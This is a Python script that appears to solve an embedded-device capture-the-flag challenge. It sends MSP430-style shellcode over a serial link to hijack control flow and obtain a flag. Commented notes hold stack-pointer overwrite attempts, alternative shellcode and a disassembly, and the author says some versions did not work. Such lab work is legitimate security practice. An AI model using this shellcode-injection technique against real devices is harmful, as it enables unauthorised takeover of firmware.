#!/usr/bin/python3

import serial
import argparse
import struct
import serial
from time import sleep
import codecs

#print(struct.pack("<I", 0xc4be))


parser = argparse.ArgumentParser()
parser.add_argument("device",type=str,help="The USB device to connect to")
parser.add_argument("baud",type=int,help="The baud rate of connecting device")
args = parser.parse_args()

offset = 10 #Change this

shellcode = b"\x0c\x12\x2c\x43\xb0\x12\xbe\xc4\x30\x41\x06\x02\xbc\xc4"

payload = b"".join([b"313373",shellcode])
payload += b"\r"

# bs = ser.write(payload)
# print(repr(bs))

ser = serial.Serial(args.device,args.baud,timeout=1)     #Open port with baud rate
print(args.device)
print(args.baud)
print(payload)
out = b''
# """This Works"""
while True:
    while ser.inWaiting() > 0:
        out += ser.read(1)

    print(out.decode(errors='replace'))
    sleep(1)
    input("Hit enter to send the payload")
    print(f'Sending payload: {payload}')
    ser.write(payload)
    while ser.inWaiting() > 0:
        out += ser.read(1)
    print(out.decode(errors='replace'))
#=================================NOTE-SECTION=======================================
#new_sp = struct.pack("<I", 0xc4b2c4b2) #target function with little-indienss

#Let's test with ret instruction and point to address 0x0218 and write our code there.
#new_sp = struct.pack("<I", 0xc4b20214) #target function with little-indienss
#nopslides = b"\x90"*2

"""The method above works, the code was able to jump to targeted address which is 0214 with hex code below

THe code belows, however, did not execute as instruction....hmmmm...what's the issue?

"""

'''

This is the opcode to obtain flag B. How about let's reuse this code.

0c 12 1c 43 b0 12 be c4 3c 41 30 41

c4b2:	0c 12       	push	r12		;
c4b4:	1c 43       	mov	#1,	r12	;r3 As==01
c4b6:	b0 12 be c4 	call	#-15170	;#0xc4be
c4ba:	3c 41       	pop	r12		;
c04bc:	30 41       	ret

'''
#new_address = struct.pack("<I", 0x020080206)
#shellcode = b"\x12\x0c\x43\x1c\x12\xb0\xc4\xbe\x41\x3c\x41\x30\xb2\xc4\xbc\xc4\x08\x20\xc4\x06\x02"
#shellcode = b"\x12\x0c\x43\x1c\x12\xb0\xc4\xbe\x41\x3c\xb2\xc4\xbc\xc4\xc4\x08\x20\x06\x02"
#shellcode = b"\x0c\x12\x1c\x43\x12\xb0\xbe\xc4\x41\x3c\x06\x02\xbc\xc4"

